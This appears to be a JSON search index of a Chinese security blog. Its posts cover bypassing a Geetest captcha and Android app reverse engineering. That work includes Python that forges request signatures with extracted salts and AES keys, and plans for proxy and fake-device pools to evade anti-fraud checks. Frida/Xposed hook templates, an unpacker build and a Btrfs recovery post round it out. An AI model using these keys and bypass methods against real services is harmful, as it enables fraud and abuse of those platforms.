返回一些配置参数如静态js文件的位置（即相对路径） GET https://api.geetest.com/get.php?gt=\u0026amp;challenge=\u0026amp;lang=zh-cn\u0026amp;pt=3\u0026amp;client_type=web_mobile\u0026amp;w={一长串}\u0026amp;callback= 仍然返回一些配置如验证开始前显示的i18n字符串 GET https://api.geetest.com/ajax.php?gt=\u0026amp;challenge=\u0026amp;lang=zh-cn\u0026amp;pt=3\u0026amp;client_type=web_mobile\u0026amp;w=\u0026amp;callback= 第一次请求 ajax.php，返回 callback值({\u0026quot;status\u0026quot;: \u0026quot;success\u0026quot;, \u0026quot;data\u0026quot;: {\u0026quot;result\u0026quot;: \u0026quot;slide\u0026quot;}}) GET https://api.geetest.com/get.php 此时刚加载了 slide.js，和第一次请求 get.php 相比多了一些 params 如 is_next=true\u0026amp;type=slide3，返回结果中有滑块验证时会显示的i18n字符串，以及滑块和图片的位置 GET https://api.geetest.com/ajax.php?gt=\u0026amp;challenge=\u0026amp;lang=zh-cn\u0026amp;%24_BBF=3\u0026amp;client_type=web_mobile\u0026amp;w=\u0026amp;callback= 最终的请求，返回 success 及 score  工程化探索 将验证码填充作为通用服务运行，让爬虫客户端无感绕过验证码，考虑在客户端和服务端（比如 puppeteer）之间使用 RPC，客户端先调起服务端，服务端进入验证码流程，但将所有请求拦截并通过 RPC 传递给客户端，客户端代为请求，响应结果作为 RPC 的返回值，服务端再强行将其作为响应，继续之后的动作，从而在验证方看来客户端正常完成了验证。\n真正开发过程中，很多时间浪费在了数据类型造成的错误中，在 proto 中我把除状态码外的所有字段定为 string，但用 axios 等库发起请求时，header 为 object，且若不在请求时指定 responseType，所获响应默认用 json 解析成 object，否则才是 text。更坑的是图片等二进制数据，获得为文本时已经铸成大错，需要先指定 responseType 为 arraybuffer（在 Node 中 blob 实际还是以文本返回，因为 blob 是 browser only），然后 res.data.toString('base64') 转成 base64 字符串通过 RPC 传递，接收方再 Buffer.from(str, 'base64') 来转成 buffer。\nJS逆向：AST还原极验混淆JS实战\n反符号混淆和控制流平坦化\n","date":"2021-12-24T16:27:26+08:00","permalink":"https://chinggg.github.io/post/bili-captcha/","tags":["逆向"],"title":"某网站的极验验证码实战"},{"categories":["安全"],"contents":"App 逆向基础 国产应用大多热衷于构筑自己的 App 围墙，很多功能没有网页版，也就无法利用浏览器一探究竟，不过我们仍然可以通过抓包、静态分析、动态调试的方法解开隐藏在 App 中的秘密。\n抓包能让我们快速获得想要的 API，不过其门槛也在不断增高，Android 7.0 之后应用不再相信非系统证书，客户端应用也可能使用 SSL Pinning 等技术防止中间人的干扰，一般用 Xposed 模块 JustTrustMe 或 TrustMeAlready 可以解决，某些关键请求可能还需额外 hook，可以为其专门定制 Xposed 模块。\n抓包获得关键请求后，分析其字段的意义，并在静态分析工具中全局搜索，定位至相关函数，应用大多会将数据编码、加密或生成摘要，这些逻辑可能放在 native 层实现，增大了逆向的难度。\n所幸 frida 等工具的出现大大便利了动态调试，可以方便地 hook 得到 Java 层各个类及其成员、方法，对于 native 层，也可在获得函数的参数和返回值，快速验证逆向分析时的想法。若由于时机等原因难以 hook，还可直接将 so 库封装到自己创建的 app 中，在 build.gradle 里添加 abiFilters 参数以指定 arm 指令集，手动复制关键类并 import，再在 MainActivity 里 loadLibrary，即可直接调用 native 层方法，调试并在断点之间 hook 更改 context 寄存器的值，查看变量的值。\n逆向得到加密数据、生成校验的算法后，便可以伪造合法的请求。编码上的细节需要多加考虑，抓包得到 params 或 body 中的参数大都是 urlencode 后的结果，但生成校验时的参数却可能是原始的字符串，构造请求时要头脑清醒。排查错误时要冷静，关键位置往往是正确的，但完全没料到的地方可能出岔子，比如谁能想到 f-string 中嵌入 bytes 型的参数，不会报错，生成的字符串里居然还带着引号，而且作为 body 发送居然看上去一模一样？\nbstr = b'feiwu' fstr = f'woshi {bstr}' print(fstr) # woshi b'feiwu'  不能以脚本小子的心态写脚本，必须做好代码的类型标注，模块化编程，这样即使无法避免问题的发生，也能在问题出现时快速定位。排查问题时脑子注意转过弯来，如果加密算法中有随机值，先固定下来，在静态的层面上观察结果，与真实样本做对比。\n实战案例复盘 某品会 edata 参数(AES 加密)\n仅有少量请求有 edata 参数，从一串 query params 型的键值对字符串，得到 AES 加密并 base64 编码后的 edata 结果，具体实现在 esNav 这个 native 函数中。\n首先静态分析，IDA 反编译后两百多行，一上来就从全局变量中获取了未知的字符串，然后放入不知所云的 gsigds 函数中进行一通操作。此时盲目扎进细节中耗时耗力而且白费功夫，只需抓住 AES 加密的核心，无非是 key 和 iv，倒过来分析代码发现前者是 md5 后的值，后者是随机的16位 hex 字符串，生成 edata 的前十六位字符便是 iv，后面再拼接 AES 加密的结果，这样服务器获得发送过来的 edata 后即可对称解密，而 key 显然应该是每次固定的，所以只需 hook 生成 md5 的函数获得返回值，便能得到 key 进而实现加密算法。\n但在测试手机上发现该应用在运行时 hook 容易崩溃，只能以 spawn 的形式 hook， 而抓包发现 edata 的请求似乎只在初始化时发送，刚启动时 native 层中的关键函数又尚未被加载，很难有合适的时机 hook，这时就可以自制 App 直接调用 Java 层函数，在断点之间 hook 即可拿到 key。\n某品会 api_sign 验证头(SHA1 摘要)\n每一个请求头都会带上 Authorization: OAuth api_sign={}，全局搜索定位到 native 函数 gsNav，是从 TreeMap\u0026lt;String, String\u0026gt;(也就是 query params) 得到一串 SHA1 摘要。\n进 IDA 分析，发现仍然调用了 gsigds 函数获取字符串，传入 getByteHash 获得了32位的 hex 字符串作为盐，拼接在从 Map 转成的 query param 型字符串前进行 SHA1 摘要，再对结果再来一次加盐摘要即得 api_sign，实际上如果熟悉 SHA1 的话看到 api_sign 是长为40的 hex 应该就能想到。\nimport base6 import hashlib import json import random from urllib.parse import unquote, parse_qsl, urlencode from Crypto.Cipher import AES from Crypto.Util.Padding import pad def gen_sign(paramstr: str) -\u0026gt; str: \u0026quot;\u0026quot;\u0026quot;paramstr will unquoted automatically\u0026quot;\u0026quot;\u0026quot; paramstr = unquote(paramstr).encode() salt = b\u0026quot;da19a1b93059ff3609fc1ed2e04b0141\u0026quot; # True salt = b\u0026quot;aee4c425dbb2288b80c71347cc37d04b\u0026quot; # False h1 = hashlib.sha1(salt + paramstr) cipher1 = h1.hexdigest().encode() h2 = hashlib.sha1(salt + cipher1) return h2.hexdigest() def gen_edata(paramstr: str) -\u0026gt; str: \u0026quot;\u0026quot;\u0026quot;paramstr: app_name=...\u0026amp;dinfo=...\u0026quot;\u0026quot;\u0026quot; paramstr = paramstr.encode() paramstr = pad(paramstr, 16) key = bytearray.fromhex(\u0026quot;8c c7 03 f6 47 8e 58 f0 84 49 d5 c0 cf 2d d5 83\u0026quot;) # True key = bytearray.fromhex(\u0026quot;cd d1 7a b2 9b 84 b3 25 52 dd cf bb 4a bf 02 25\u0026quot;) # False key = bytes(key) ran16b = ''.join(random.choices('0123456789abcdef', k=16)).encode() cipher = AES.new(key, AES.MODE_CBC, iv=ran16b) enctext = cipher.encrypt(paramstr) ans = base64.b64encode(ran16b + enctext) return ans.decode() def dec_edata(b64s: str) -\u0026gt; str: enctext = base64.b64decode(b64s.encode()) key = bytearray.fromhex(\u0026quot;8c c7 03 f6 47 8e 58 f0 84 49 d5 c0 cf 2d d5 83\u0026quot;) # True key = bytearray.fromhex(\u0026quot;cd d1 7a b2 9b 84 b3 25 52 dd cf bb 4a bf 02 25\u0026quot;) # False key = bytes(key) iv = enctext[:16] cipher = AES.new(key, AES.MODE_CBC, iv=iv) raw = cipher.decrypt(enctext[16:]) try: return raw.decode() except: return raw  某物 app so newSign 参数分析\n常规抓包只能看见小部分请求，检索 NO_PROXY，发现 okhttp3.OkHttpClient$Builder.proxy 处可以 hook，果然 hook 后才可抓到关键请求如 /api/v1/app/search/ice/search/list，检索该 URL 果然在 com.XXX.common.base.delegate.tasks.net.ApiConfigCons 中发现了 BLACK_LIST 这一个黑名单集合。\n搜索请求中的 newSign 字段，发现 WebRequestInterceptor.intercept 会给请求附上 newSign， 其值为 RequestUtils.c(hashMap, timestamp) 的结果，c 这个方法就是在 map 中再补充一些键值对，然后生成按字典序拼接 kv 得到的字符串，传进 AESEncrypt.encode(context, str) 方法，返回值再套一层 f 方法（即 md5）即为最终的 newSign。关键是 AESEncrypt.encode 这个方法里调了 NCall.IL() 这个 Native 函数，然而在 libGameVMP.so 中却无法继续跟踪，用 frida dump 出的 so 不再显示格式错误，但仍然找不到 IL 这个函数。\n模拟 Bili Android 客户端\nYmlsaWJpbGk= app分析\nNative逆向指北(一)——BiliBili Sign\ncom.bilibili.lib.accounts.BiliAuthService 列出了登录相关 API，com.bilibili.lib.accounts.a implements com.bilibili.okretro.interceptor.DefaultRequestInterceptor 会给这些请求 addCommonParam，并在最后附加 sign([0-9a-f]{32})，注意 a 重写了 DefaultRequestInterceptor 的方法，不要 hook 错成后者。\nstatistics={\u0026quot;appId\u0026quot;:1,\u0026quot;platform\u0026quot;:3,\u0026quot;version\u0026quot;:\u0026quot;6.54.0\u0026quot;,\u0026quot;abtest\u0026quot;:\u0026quot;\u0026quot;} qdic_base = {'appkey': '783bbb7264451d82', 'build': '6540300', 'buvid': '^XY[A-F0-9]{35}', 'c_locale': 'zh-Hans_CN', 'channel': 'bili', 'mobi_app': 'android', 'platform': 'android', 's_locale': 'zh-Hans_CN', 'statistics': json.dumps(statistics, separators=(',', ':'))}  以上参数是所有请求的 base query，可固定在配置文件中，这样针对特定请求仅需添加 extra query 即可\n其中 buvid 跟到 com.bilibili.lib.blkv.internal.kv.KVs.getString(\u0026quot;buvid\u0026quot;, \u0026quot;\u0026quot;)，因为自行实现的 KV 存储，但有 getString 就会有 putString，直接 hook java.util.HashMap 的 put 方法，最早 put buvid_local 是在 com.bilibili.lib.biliid.api.c.b.a 这个方法中，而该方法里调用了 interface w1.g.x.g.a 的 a 方法得到字符串，无法直接跳转，找 interface 的实现，最终在 w1.g.x.g.d.b 中生成字符串，传入参数是 interface w1.g.x.g.b 类型，依次调用其 c, d, a, b 方法，获得非空字符串则进行操作直接返回，静态跟入太烦，直接 hook 该参数打印四个方法所得字符串，发现就生成 buvid 而言，c 为空，d 为 MAC 地址，则直接对 MAC 地址进行相应 md5 操作即可，验证结果一致。\nsign 的生成在 com.bilibili.nativelibrary.LibBili.signQuery(Map\u0026lt;String, String\u0026gt;)，实际调用 native 函数 s，但其在 libbili.so 中是动态注册的，考虑编写 Xposed 模块主动调用\n[RegisterNatives] java_class: com.bilibili.nativelibrary.LibBili name: s sig: (Ljava/util/SortedMap;)Lcom/bilibili/nativelibrary/SignedQuery; fnPtr: 0xc13138e9 fnOffset: 0x68e9 callee: 0xc1313303 libbili.so!JNI_OnLoad+0x14e  public String genSQ(Map\u0026lt;String, String\u0026gt; map) { try { Class cls = XposedHelpers.findClass(\u0026quot;com.bilibili.lib.accounts.a\u0026quot;, g_classLoader); Object ins = XposedHelpers.newInstance(cls); Object res = XposedHelpers.callMethod(ins, \u0026quot;signQuery\u0026quot;, map); return res.toString(); } catch (Exception e) { e.printStackTrace(); Log.e(TAG, map.toString() + \u0026quot; \u0026quot; + g_classLoader.toString()); } return \u0026quot;\u0026quot;; }  登录界面输完手机号，点击发送短信验证码会向 https://passport.bilibili.com/x/passport-login/sms/send 发起请求，除了用户控制的 cid 和 tel 该请求还需附带 login_session_id 和 device_tourist_id，不难逆得前者 buvid 拼接毫秒 timestamp 再 md5 得到长为16的 hex 字符串，后者实际键名为 guest_id，应用初始化时向 https://passport.bilibili.com/x/passport-user/guest/reg 发请求拿到，而该请求又要附带 dt 和 device_info 两个参数。\n接着 hook 对应函数和 HashMap 键值，得到关键类 com.bilibili.lib.accounts.BiliPassportApi 和方法 l,k,j，其中 l 创建了一个 kotlin Function，依次传到 j 中再 invoke，hook com.bilibili.lib.accounts.BiliPassportApi$getGuestID$1(这是一个 Function) 的构造方法即可看到传入的 HashMap 在 com.bilibili.lib.accounts.e.a 中生成\n{ \u0026quot;AndroidID\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;BuildBrand\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;BuildDisplay\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;BuildFingerprint\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;BuildHost\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;Buvid\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;DeviceType\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;MAC\u0026quot;: \u0026quot;\u0026quot;, \u0026quot;fts\u0026quot;: \u0026quot;\u0026quot; }  invoke 返回 JSONString，getBytes 传入 com.bilibili.lib.accounts.n.c c，c 返回 Pair\u0026lt;随机[A-Z][a-z][0-9]{16}字符串, 长为bytes两倍的HEX字符串\u0026gt;，前者作为 AES/CBC/PKCS5Padding 的 key 和 IV 加密 JSONString 转成的 bytes，后者是 AES 加密后的 bytes 转成 HEX。然后再调用 com.bilibili.lib.accounts.model.AuthKey encrypt 对前者做 RSA/ECB/PKCS5PADDING 公钥加密并 b64encode，最后前者为 dt，后者即为 device_info 发送。RSA 的公钥又从哪来？https://passport.bilibili.com/x/passport-login/web/key 即得，因为不变动所以直接存为常量，注意加密时掐头去尾了。那么对方后端接收到 dt 后先 b64decode 再用私钥解密，即得 AES 的 key，然后即可解密 device_info\nsms/send 只是短信登录的一半，该请求返回非空字符串 recaptcha_url 或 captcha_key，若为前者则需先完成极验滑动验证码才能继续登录流程，后者则直接发送了验证码，带上 captcha_key 和短信接收到的 code 向 login/sms 发 POST 请求即可完成登录，返回 JSON 数据，包含关键信息如 mid（即用户 id）和 access_token（附加在后续请求头 authorization 中）\n密码登录 https://passport.bilibili.com/x/passport-login/oauth2/login，明文密码前拼接上 web/key 得到的 hash，做 RSA/ECB/PKCS5PADDING 公钥加密并 b64encode，dt 和 device_meta 组合仍然是一对，前者是 RSA 加密过的 AES 密钥，后者是 Function0 BiliPassportApi$loginV3$1 invoke() 后返回的 JSONString 做 AES 加密的 HEX 结果。返回 message 可能为 验证码错误 或 账号存在风险需使用手机号验证，前者则 url 为 h5 验证码，后者则 url 为短信验证码（点击发送前仍会弹出验证码），\n琐碎的参数看的人头晕眼花，本质都是设备指纹（FingerPrint，缩写为fp），注意常见\n接着看私信，抓包得 https://app.bilibili.com/bilibili.im.interface.v1.ImInterface/，发私信即 SendMsg，实测重放请求就能收到多条信息，有意思的是 Content-Type: application/grpc，看到这个就该想到直接找 protobuf 定义了，但初遇没经验还是在 Java 层抽丝剥茧，com.bapis.bilibili.im.interfaces.v1.ReqSendMsg，一路追溯确实能精准定位到方法 w1.g.h.d.b.b.i.t0.R 初次返回了具有附带足够信息的 Message，但对于这种场景，与其挖空心思跟踪客户端层面数据是如何生成的，不如直接从最终请求的层次上搞清数据是什么。\n工程化知识沉淀 抓包阶段：\n要抓总能抓到，熟练使用趁手的软件\n注意数据的呈现格式，以 Fiddler 为例， WebForms 栏中展示的是 urldecode 后的结果，而 TextView 和 SyntaxView 才是原始格式，对于 Content-Type: application/x-www-form-urlencoded 的 POST 请求亦是如此\n分析请求中的基础参数，迅速导出为 JSON 备用\n逆向阶段：\n动静结合，静态查找 URL 或参数名称，从网络请求跟进到数据获取一般比较直接，但异步数据何时生成，由何生成可能难以看出，可以动态 hook 数据获取的函数以及 HashMap SharedPreference 等存取键值的函数，在打印的调用栈上获得下一步静态分析的目标，以此往复。\n有时会看到新的语言特性，JADX 无法将 kotlin.jvm.functions.Function0 还原为类，而 GDA 做的就比较好\n解密阶段：\n区分字符串在 bytes 和 字符编码层面的表示，熟练转换 json, str, bytes, hexstring, bytearray\n理解对称加密、非对称加密、摘要算法各自的特点和用途，熟知 MD5, AES, RSA 在 Java 与 Python 库中的实现，知道 PKCS5 与 PKCS7 的异同 常见流程：生成 [A-Z][a-z][0-9]{16} 的随机字符串，作为 AES 的 (128bit) Key 或 IV，对 bytes 明文进行加密，然后 AES Key 又用 RSA 公钥加密，把两者都在请求中发送，服务端用私钥解密得 AES Key，然后再 AES 解密明文。\n请求阶段：\nfrom urllib.parse import parse_qsl, quote, urlencode 熟练使用网络请求库，如 requests.post 如果 data 为字符串，Content-Type 默认为空，服务端预期为 application/x-www-form-urlencoded，故而会返回错误\n使用 Sekiro 快速搭建主动调用加密函数的 API\nAndroid逆向之无加固下的Java层和Native层模拟的调度解决方案\n池化阶段：\n打造批量 IP 代理池、伪造设备池，熟悉各种设备指纹\n参考文献 https://pitechan.com/爬虫工程师的自我修养之基础模块/\nhttps://curz0n.github.io/2021/05/10/android-so-reverse/\n主流安卓APP反作弊及反反作弊的一些思路和经验汇总\n","date":"2021-11-30T14:36:28+08:00","permalink":"https://chinggg.github.io/post/appre/","tags":["逆向"],"title":"AppRE"},{"categories":["记录"],"contents":"用上 Btrfs 不到两个月，还没怎么享受透明压缩和增量快照带来的好处，却已为它熬过几个艰难的夜晚\n先是 WinBtrfs 的问题，btrfs check --repair 幸运地修回来，果断注册表里改成只读\n但之后在 Arch 中作死用 VMWare 从物理磁盘启动自身，却造成了毁灭性后果，整个系统突然变为 ro，重启后果然 transid error 无法进入\n老规矩先抢救数据， restore 到 ext4 格式的移动硬盘（exFAT 真没用）\n这次虽然 transid 只差了 1，但 check 后发现问题比上次更为严重，check -b, check -s 1 结果都不妙\n记下 btrfs-find-root 的结果以备之后 repair\n但可惜 repair 也无能为力，可能还让事情更糟了，试了 rescue zero-log 也没救回\n神奇的是进 Win 还能正常识别文件，也不知道是 repair 还是 rescue 让 btrfs 分区能直接挂载了\n现在问题变成了 EIO，理论上是盘坏了但它肯定没坏，数据都还能读但无法恢复正常\n没办法，趁还可以挂载 btrfs 分区，rsync -aviHAXKhP 再备份一遍到移动硬盘（注意 exclude 快照和无用大目录，否则等一晚上）\n把 btrfs 分区格了再从移动硬盘拖回去，子卷化，改 fstab，重做 grub 引导，终于进入了熟悉的 Arch\n然而用户配置等方面还是有问题，可能第二回的备份不全，把之前备份的配置覆盖回去。pacman 还有数据不一致问题，overwrite 解决\n","date":"2021-11-28T20:50:22+08:00","permalink":"https://chinggg.github.io/post/btrfs/","tags":["环境配置","长期"],"title":"Btrfs 踩坑记录"},{"categories":["安全"],"contents":"Frida 万金油动态调试工具，配合自己收集定制的 hook 模板代码，稍作修改就可以快速查看 Java 层的类及其方法成员信息和 Native 层函数的参数与返回值，便于验证自己的想法，但实际上手可能还会遇到不少坑点令人苦恼：\n Java/Native 层数据结构映射到 JS 这种动态语言，可能需要 cast 或者自己转换成 JS 中的类型 Native 层通过 findExportByName 获取函数不够准确，可能还要通过地址 不应发生的 cannot access address \u0026hellip; 问题  https://www.anquanke.com/post/id/195869\nhttps://kevinspider.github.io/fridahookjava/\nhttps://kevinspider.github.io/fridahookso/\nhttps://kevinspider.github.io/zhuabao/\nhttps://eternalsakura13.com/2020/07/04/frida/\nhttps://github.com/lasting-yang/frida_dump/\nhttp://www.juziss.cn/2020/07/11/彻底搞定Hook不上/\nfunction map2obj(map) { var res = {}; var keyset = map.keySet(); var it = keyset.iterator(); while (it.hasNext()) { var keystr = it.next().toString(); var valuestr = map.get(keystr).toString(); res[keystr] = valuestr } return res; } function body2str(reqBody) { const Buffer = Java.classFactory.use(\u0026quot;okio.Buffer\u0026quot;); const buf = Buffer.$new(); reqBody.writeTo(buf); return buf.readUtf8(); return buf.toString(); // only get summary } function printable(variable, type) { if (type.includes(\u0026quot;Map\u0026quot;)) { return JSON.stringify(map2obj(variable), null, 4) return variable.entrySet().toArray() } if (type.includes(\u0026quot;RequestBody\u0026quot;)) { return body2str(variable) } return variable; } function dfs(self, depth) { if (depth \u0026gt; 6) return {} const obj = {} const cls = self.getClass() const fields = cls.getDeclaredFields() // console.log(\u0026quot;-\u0026quot;.repeat(depth), \u0026quot;dfs\u0026quot;, cls, self) // console.log(\u0026quot;-\u0026quot;.repeat(depth), \u0026quot;fields:\u0026quot;, fields) const immediates = ['short', 'int', 'long', 'float', 'double', 'boolean', 'String'] fields.forEach(x =\u0026gt; { x.setAccessible(true) const v = x.get(self) if (v === null) return const s = x.toString() // public type fullname // const type = x.getType() // class java.lang.String // const k = x.getName() // short name // console.warn(x, v, k, type) if (immediates.some(type =\u0026gt; s.includes(type))) { obj[x] = v.toString() } else { // inner class obj[x] = dfs(v, depth+1) } }) return obj } function hookJava() { var cls = Java.classFactory.use(\u0026quot;com.package.classname\u0026quot;); cls.methodName.implementation = function (a1, a2, a3, a4) { console.log('\u0026gt;'.repeat(10), \u0026quot;hookJava begin\u0026quot;) let a2str = JSON.stringify(map2obj(a2), null, 4) console.log(a1, a3, a4) console.warn(a2str) var res = this.methodName(a1, a2, a3, a4) console.warn('res:', res) return res console.log(\u0026quot;hookJava end\u0026quot;, '\u0026lt;'.repeat(10)) } } function printStack() { console.log(Java.use(\u0026quot;android.util.Log\u0026quot;).getStackTraceString(Java.use(\u0026quot;java.lang.Exception\u0026quot;).$new())) } function hookJavaFunc(clsName, funcName, argtypes, rettype, stack, func) { const cls = Java.classFactory.use(clsName) let funcObj = cls[funcName]; if (argtypes !== undefined) funcObj = funcObj.overload(...argtypes); const defaultFunc = function () { console.log('\u0026gt;'.repeat(10), funcName, \u0026quot;begin\u0026quot;) const argc = Array.from(arguments).length if (argtypes == null) argtypes = Array(argc) for (let i = 0; i \u0026lt; argc; i++) { console.log(printable(arguments[i], argtypes[i])); } const res = funcObj.apply(this, Array.from(arguments)) console.warn('res:', printable(res, rettype)) console.log(funcName, \u0026quot;end\u0026quot;, '\u0026lt;'.repeat(10)) if (stack) printStack() return res } funcObj.implementation = func || defaultFunc; } function hookMap(keywords) { const cls = Java.classFactory.use(\u0026quot;java.util.HashMap\u0026quot;) cls.get.implementation = function (key) { const res = this.get(key) const kStr = key ? key.toString() : '' if (keywords.some(w =\u0026gt; kStr.includes(w))) { console.error(\u0026quot;hookMap get\u0026quot;, key, \u0026quot; =\u0026gt; \u0026quot;, res) printStack() } return res } cls.put.implementation = function (key, value) { const res = this.put(key, value) const kStr = key ? key.toString() : '' // const vStr = value ? value.toString() : '' if (keywords.some(w =\u0026gt; kStr.includes(w))) { console.error(\u0026quot;hookMap put\u0026quot;, key, value) printStack() } return res } } function hookProxy() { var cls = Java.classFactory.use(\u0026quot;okhttp3.OkHttpClient$Builder\u0026quot;); cls.proxy.implementation = function (a1) { console.log('\u0026gt;'.repeat(10), \u0026quot;hookProxy begin\u0026quot;) console.warn(a1) return this } } function hookNative() { let m = Process.findModuleByName('lib.so') let f = Module.findExportByName('lib.so', 'Functions_xx') console.log(m.base, f) // f = m.base.add(0xBDB8C) Interceptor.attach(f, { onEnter: function (args) { console.warn(\u0026quot;args:\u0026quot;, args[1], args[1].readCString()) }, onLeave: function (ret) { console.warn(\u0026quot;ret:\u0026quot;, ret, ret.readCString()) // this.context.r0 = 1 } }) } function findModules(name) { const mods = Process.enumerateModules() const found = name ? mods.filter(m.path.includes(name)) : mods; found.forEach(m =\u0026gt; console.log(JSON.stringify(m))) console.log(found.length, \u0026quot;modules found\u0026quot;) return found } function main() { if (Java.available) { Java.perform(() =\u0026gt; { console.log(\u0026quot;Performing Java hook...\u0026quot;) hookJava(); hookJavaFunc(\u0026quot;okhttp3.Request$Builder\u0026quot;, \u0026quot;post\u0026quot;, [\u0026quot;okhttp3.RequestBody\u0026quot;], undefined, true); }) } // hookNative(); // findModules(\u0026quot;libart\u0026quot;); } setImmediate(main)  Xposed https://wooyun.js.org/drops/Android.Hook框架xposed篇(Http流量监控).html\nXposed真的可以为所欲为——终 · 庖丁解码\nhttps://www.cnblogs.com/baiqiantao/p/10699552.html\nhttps://www.huruwo.top/使用xposed-hook-native详解/\nhttps://blog.bluarry.top/2020/02/28/2020-02-28-xposed模块编写之常用hook函数API/\n流程如下： 先建安卓项目，Empty Activity 或 No Activity 均可\n在 AndroidManifest.xml 的 \u0026lt;application\u0026gt; 标签下添加\n\u0026lt;meta-data android:name=\u0026quot;xposedmodule\u0026quot; android:value=\u0026quot;true\u0026quot; /\u0026gt; \u0026lt;meta-data android:name=\u0026quot;xposeddescription\u0026quot; android:value=\u0026quot;Learn Xposed\u0026quot; /\u0026gt; \u0026lt;meta-data android:name=\u0026quot;xposedminversion\u0026quot; android:value=\u0026quot;89\u0026quot; /\u0026gt;  在 app 的 build.gradle 中添加 dependency\ncompileOnly 'de.robv.android.xposed:api:82' compileOnly 'de.robv.android.xposed:api:82:sources'  任意新建类 implements IXposedHookLoadPackage，创建文件 assets/xposed_init（Android Studio 右键 app 新建 Folder -\u0026gt; Assets Folder 即可，实际位置在 src/app/main 下），向其中写入完整类名，即可生效。\npublic void handleLoadPackage(XC_LoadPackage.LoadPackageParam lpparam) throws Throwable { if (!lpparam.packageName.equals(lpparam.processName)) return; // 保证每个应用只在其主进程来一次 if (!lpparam.packageName.equals(\u0026quot;com.example.appname\u0026quot;)) return; }  hook原理\n","date":"2021-11-17T16:38:08+08:00","permalink":"https://chinggg.github.io/post/android-hook/","tags":["Android","逆向"],"title":"Android Hook"},{"categories":["安全"],"contents":"编译脱壳机 Pixel 3a XL 一台，代号 bonito，先恢复出厂系统 ，再准备相应源码， android-9.0.0_r47 对应 版本号 PQ3B.190801.002 对应，android-10.0.0_r2 对应 版本号 QP1A.190711.020\n首先上手编译安卓源码，从中科大源拉取 AOSP\nrepo init -u git://mirrors.ustc.edu.cn/aosp/platform/manifest -b android-10.0.0_r2 repo sync source build/envsetup.sh lunch # 选择 bonito-userdebug m # 注意装齐依赖，老版本需要 py2  拉取时：\n  为刷入真机，开始编译前必须下载并解压对应机型版本的驱动！！\n  关于 repo 工具的分析，总之要区分 Repo 自身, manifest, project 三种不同层次的 repository\n  切换不同版本时 repo forall git checkout 会带来不同 project 在 branch 上的差异，应该再次 init 并 sync\n  编译时：\n Arch Linux 下编译可参考：https://blog.firerain.me/article/13，可能要装 ncurses5-compat-libs 尽量不要用 root 用户编译，可能会有报错 flex locale 报错，改 LC_ALL=C 亦无效，进 prebuilts/misc 手动编译 flex apache-xml 报错，手动编译该部分 make clean-apache-xml make apache-xml 新增文件时，需将包名加至白名单 build/make/core/tasks/check_boot_jars/package_whitelist.txt  刷入时：\n Win 下 fastboot not detect device，安装 Google USB Driver 即可 Win 下 fastboot freeze/hang when flashing，尝试其他命令如 getvar all 远程 build 也可在本地 flash，拷贝输出目录下的*.img 至本地，ANDROID_PRODUCT_OUT=\u0026quot;./\u0026quot; fastboot flashall 即可 如果编译成功但刷入后发现无法开机，日志中有报错如  编译指南\n若有其他报错且全网难搜，先仔细看报错信息，定位相关代码是否位置与原版有出入，或是否可修改。\n只修改几处，也可能编译近几千个文件，花费数十分钟，务要小心谨慎。\n如何对 repo 进行版本管理：在对应 project 下仅添加改动的文件至暂存区，不新增 commit，也不使用 repo start 创建全局新分支，只用 repo diff 手动管理版本\n原理浅析 App 加固\n应用启动会从 ActivityThread 进入，在方法 performLaunchActivity 的最后执行 fartthread()\nYoupk 源码解读 自定义的代码几乎都封装在了 Unpacker 这个类里，额外添加 cJSON 和 unpacker 的 .h 和 .cc 共四个文件，可读性好，可惜基于 android-7.1.2_r33，会有一些大区别\nArt 部分改动的文件：\n dex2oat.cc  添加 shouldUnpack() 在 FINAL::ParseArgs() 中检查 shouldUnpack() 并 SetCompilerFilter  Android 9 的 CompilerFilter 中不再有 kVerifyAtRuntime     Android.mk(Nougat) -\u0026gt; Android.bp(Pie)  添加新文件至列表   artmethod.cc  在 Invoke() 中检查 Unpacker::isFakeInvoke() 如果是主动调用 FakeInvoke 并且是 native 方法则不执行   class_linker.h  让 Unpacker 成为 ClassLinker 的友元   runtime.cc  Runtime::RegisterRuntimeNativeMethods()   interpreter_switch_impl.cc  PREAMBLE_SAVE 中执行 beforeInstructionExecute ExecuteSwitchImplCpp 中执行 afterInstructionExecute   interpreter.cc  kInterpreterImplKind 从 kMterpImplKind 改为 kSwitchImplKind    从 Android 7 到 Android 9 导致 unpacker.cc 的改动\n 字段名与命名空间  StringPrintf 在 android::base:: 下 art:🪞:Class 下的 Status 被移到 art::ClassStatus 以 enum class PointerSize 代替 size_t，区分 32/64 位   DexFile 大变  文件移至新目录 art/libdexfile 下 DexFile 派生成 standard 和 compact CodeItem 原本 public 属性变 private，无法 offset 安卓 9 提供了 DexFile::GetCodeItemSize   ObjPtr  ClassLinker 类许多方法均返回了 ObjPtr，需调整 soa.Decode() 返回 ObjPtr，需 .Ptr()    技术进展 修改安卓源码：Art 模式下的通用脱壳方法\n脱壳原理及如何实现脱壳机\nFART 脱壳流程分析\ndex修复\n源码解析及编译支持 Pixel2\nDex起步探索\nFART 与 Youpk 结合\nFartExt之优化更深主动调用的FART10\nhttps://www.huruwo.top/fart脱壳机的使用与进阶2_fart使用相关原理和知识点/\nhttps://sentrylab.cn/blog/2022/安卓逆向-脱壳学习记录/\n问题复盘  闪退  E .bj.xhhosp.hsy: fartext ArtMethod::dumpArtMethod enter void com.XXX.healthrecord.databinding.HsIncludeMedicalRecordEditBinding.\u0026lt;init\u0026gt;(android.widget.LinearLayout, android.widget.TextView, android.widget.TextView, android.widget.LinearLayout, android.widget.TextView, android.widget.TextView, android.widget.LinearLayout, android.widget.TextView, android.widget.TextView, android.widget.LinearLayout, android.widget.TextView, android.widget.TextView, android.widget.LinearLayout, com.XXX.ui.edittext.CustomEditText, android.widget.TextView, android.widget.TextView, com.XXX.ui.edittext.CustomEditText, android.widget.TextView, com.XXX.ui.edittext.CustomEditText, android.widget.TextView, com.XXX.ui.edittext.CustomEditText, android.widget.TextView, android.widget.TextView, android.widget.TextView, android.widget.LinearLayout, android.widget.TextView, android.widget.TextView, android.widget.LinearLayout, android.widget.TextView, android.widget.TextView, android.widget.LinearLayout, android.widget.TextView, android.w  ❯ grep \u0026quot;databinding.HsIncludeMedicalRecordEditBinding\u0026quot; 